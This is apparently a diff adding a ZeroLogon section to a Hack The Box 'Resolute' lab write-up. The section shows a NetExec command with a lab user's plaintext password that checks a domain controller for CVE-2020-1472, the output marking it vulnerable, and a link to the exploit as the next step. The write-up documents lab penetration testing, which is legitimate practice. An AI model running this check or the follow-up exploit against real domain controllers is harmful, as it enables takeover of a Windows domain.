@@ -476,4 +476,15 @@ Using faketime to sync with the domain controller i am able to get a shell as `n
 
 ## ZeroLogon
 
+```python
+faketime '20:23:41.744969' nxc smb resolute.megabank.local -u melanie -p 'Welcome123!' -M zerologon                                                           
+SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
+ZEROLOGON   10.129.96.155   445    RESOLUTE         VULNERABLE
+ZEROLOGON   10.129.96.155   445    RESOLUTE         Next step: https://github.com/dirkjanm/CVE-2020-1472
+```
+Nxc identified it is vulnerable
 
+```python
+
+```
